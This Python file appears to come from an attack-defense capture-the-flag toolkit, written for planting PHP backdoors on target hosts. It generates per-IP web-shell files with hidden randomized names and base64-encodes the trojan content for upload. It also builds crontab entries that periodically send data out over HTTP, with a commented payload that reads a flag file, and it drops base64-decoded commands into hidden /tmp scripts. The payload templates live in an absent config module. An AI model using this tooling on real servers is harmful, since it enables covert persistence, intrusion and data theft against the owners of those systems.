import hashlib
import base64
import config
import time
import random
def uploadPackage(tarFileName):
    return "unimplementException"

#后门基本配置
class BackdoorDescription:
    key=''
    url=''
    ___trojContent=''
    def __init__(self,key,url,content):
        self.key=key
        self.url=url
        self.trojContent=content
    @property
    def trojContent(self):
        return self.__trojContent
    @trojContent.setter
    def trojContent(self,v):
        tmpTrojBase64Code=base64.b64encode(v.encode("utf-8")).decode("utf-8")
        self.__trojContent=config.uploader.format(tmpTrojBase64Code,self.url)
class BackdoorDescriptions:
    childs=[]# of BackdoorDescription
    def __init__(self,ips,path):
        for index in range(len(ips)):
            raw=f'sf{ips[index]}fs'
            backdoor_key=f'{hashlib.md5(raw.encode("utf-8")).hexdigest()}'
            bckFileLen=random.randint(5,20)
            tmpFilename=f'{path}.{backdoor_key[:bckFileLen]}.php'
            tmpTroj=config.backdoor_tpl.format(hashlib.md5(backdoor_key.encode("utf-8")).hexdigest(),backdoor_key[-5:])
            self.childs.append(BackdoorDescription(backdoor_key,tmpFilename,tmpTroj))
    def __getitem__(self,index):
        return self.childs[index]
    def __setitem__(self, index, value):
        self.childs[index]=value
    def __delitem__(self,index):
        del self.childs[index]

def buildCrontab(interval,url,payload,httpType=0):
    #payload='flag="$(cat /home/web/flag/flag)"&token={token}'
    model=config.httpSendModel[httpType].format(url,payload)
    raw= f"{interval} * * * * {model}"
    return raw
def buildCmd(rawCmd):
    raw =base64.b64encode(f'{rawCmd}\n'.encode('utf-8')).decode('utf-8')
    md5Str=hashlib.md5(f"{str(time.time())}{raw}".encode("utf-8")).hexdigest()
    return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d | /bin/cat  > /tmp/.{md5Str}.sh',md5Str

#使用备份的镜像重新部署服务器
class reDeployServer():
    pass